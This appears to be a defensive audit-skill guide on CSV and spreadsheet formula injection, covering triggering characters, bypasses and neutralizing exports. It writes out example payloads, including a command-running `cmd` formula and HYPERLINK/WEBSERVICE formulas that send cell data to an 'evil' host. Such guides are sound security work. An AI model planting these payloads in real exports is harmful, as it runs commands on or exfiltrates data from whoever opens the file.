# CSV / spreadsheet vulnerabilities

> - This knowledge extends your judgment. Apply what fits the project and keep reasoning beyond the list.
> - Source: OWASP, <https://owasp.org/www-community/attacks/>.

## Rules

- This skill audits and explains.
- By default, it never rewrites your code.

## What to look for

This terrain is **code that writes untrusted values into a CSV or any spreadsheet-bound export**. The file is inert text, but Excel, LibreOffice Calc, and Google Sheets evaluate any cell that begins with a formula character. So an export routine that emits user-controlled content, a "download my data" button, an admin report of submitted fields, an invoice built from order notes, ships an injection that fires in whoever opens the result. The server never runs the formula, yet the server-side write is the only place to neutralize it.

### Formula injection (CSV / Excel / Sheets)

A cell starting with `=`, `+`, `-`, `@`, a leading tab (`0x09`), or a carriage return (`0x0D`) is parsed as a formula. A crafted value such as `=cmd|'/c calc'!A1`, `=HYPERLINK("http://evil/?"&A1)`, or `=WEBSERVICE("http://evil/"&A1)` can run a command (a known spreadsheet RCE, or the user clicked past a warning), exfiltrate other cells to an attacker URL, or hijack the click. Two traps defeat a naive guard. A payload placed **after a field separator or quote** (`x",=1+2`) starts a _new cell_ mid-value, so checking only the field's first character misses it. **Full-width variants** (`＝`, `＋`, `－`, `＠`) are read as formulas in some locales and slip past an ASCII-only check. Excel also strips quotes and escapes on save-and-reopen, re-activating escaping that looked safe.

Safer shape: neutralize every field as it is written, not only the ones that look risky.

- **Prefix any cell beginning with `=`, `+`, `-`, `@`, tab, or CR (and the full-width variants) with a single quote (`'`)**, or quote the field and put the quote inside, so the program reads it as text.
- **Quote every field and double embedded quotes**, so a value cannot break out and start a new cell whose own start carries a formula character.
- **Prefer a typed format where the consumer accepts one:** a true `.xlsx` with text-typed cells, or JSON, has no formula-evaluation surface.
- **Match the mitigation to the consumer:** no single escaping is safe for both a human spreadsheet and a machine parser at once (the tab-prefix that stops Excel can corrupt a later import), so treat an export feeding both as two outputs.

## How to act on the result

- **In detect (detection):** each place the code writes an untrusted value into a CSV or spreadsheet cell without neutralizing formula-initiating characters is a finding. Record what it is (the export or report routine and the user-controlled field it emits), why it matters (a formula runs, exfiltrates the sheet, or hijacks the click when the file is opened), and the evidence (the export code and where the field comes from). It flows through detect's normal steps and is tracked like any other finding.
- **In verify (proof):** the control holds only when every field is neutralized before it reaches the file: cells beginning with `=`, `+`, `-`, `@`, tab, or CR (including full-width variants) are prefixed or quoted as text, fields are quoted with embedded quotes doubled, and the mitigation matches the actual consumer. If an exported value can still be evaluated as a formula by the program that opens it, the risk is not closed: record it and point back to harden.
